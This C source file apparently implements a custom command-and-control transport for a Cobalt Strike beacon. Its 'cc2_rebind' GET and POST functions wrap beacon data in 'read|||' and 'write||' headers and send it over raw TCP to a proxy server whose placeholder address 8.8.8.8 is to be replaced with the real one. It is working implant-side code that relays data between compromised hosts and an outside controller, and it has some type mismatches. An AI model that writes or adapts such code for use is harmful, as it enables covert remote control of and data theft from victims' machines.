#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  


int sendTCP(char *hostIP, int port, int msgType, char *request, int request_len, char **response, int *response_len) {
    *response_len = 0;
    int sockfd, n;
    struct sockaddr_in servaddr;
    char recvline[1024];
    if((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
        printf("socket error\n");
        return -1;
    }

    bzero(&servaddr,sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    printf("socket: host: %s\nport:%d\npostData:%s\n",hostIP, port, request);
    if(inet_pton(AF_INET,hostIP,&servaddr.sin_addr) <= 0) {
        printf("inet_pton error\n");
        return -1;
    }

    if(connect(sockfd,(struct sockaddr *)&servaddr,sizeof(servaddr)) < 0) {
        printf("connect error\n");
        return -1;
    }

    // send msgType GET/POST
    // msgType = 1      read_2_cs_teamserver
    // msgType = 2      write_2_cs_teamserver
    char *msgHeader = NULL;
    if (msgType == 1) {
        msgHeader = "read|||";
    } else {
        msgHeader = "write||";
    }
    printf("send msgHeader(msgType = %s)\n", msgHeader);
    write(sockfd, msgHeader, strlen(msgHeader));
    printf("send msgBody\n");
    write(sockfd, request, request_len);
    char *response_t = NULL;
    do
    {
        n = read(sockfd,recvline,1024);
        *response_len += n;
        response_t = (char *)realloc(response_t, *response_len + 1);
        char *temp_ptr = response_t + (*response_len - n);
        memcpy(temp_ptr, recvline, n);
    } while (n > 0);
    response_t[*response_len] = 0;
    *response = response_t;
    if (*response_len > 0)
        *response_len = *response_len - 1;
    close(sockfd);
    return 1;
}

void cc2_rebind_get_protocol(char *reqData, char **outputData, long long *outputData_len) {
    printf("------ custom get protocol ------\n");
    // 8.8.8.8 replaced with the real proxy_server ip
    sendTCP("8.8.8.8", 7777, 1, reqData, strlen(reqData), outputData, outputData_len);
    if (*outputData_len > 0) {
        printf("http response(%d): \n", *outputData_len);
        printf("-----end-----\n");
        printf("\nb64 response: %s\n", *outputData);
    }
    printf("------ custom protocol ------\n");
}
void cc2_rebind_post_protocol(char *reqData, char *id, char **outputData, long long *outputData_len) {
    printf("------ custom post protocol ------\n");
    // printf("post Data: %s\n", reqData);

    char *split = "->|<-";
    char *rawData = (char *)calloc(1, strlen(reqData)+strlen(id)+strlen(split)+1);
    strncpy(rawData, id, strlen(id));
    strncpy(rawData+strlen(id), split, strlen(split));
    strncpy(rawData+strlen(id)+strlen(split), reqData, strlen(reqData));

    // 8.8.8.8 replaced with the real proxy_server ip
    sendTCP("8.8.8.8", 7777, 2, rawData, strlen(rawData), outputData, outputData_len);
    if (*outputData_len > 0) {
        printf("http response(%d): \n", *outputData_len);
        printf("-----end-----\n");
        printf("\nb64 response: %s\n", *outputData);
    }
    free(rawData);
    rawData = NULL;
    printf("------ custom protocol ------\n");
}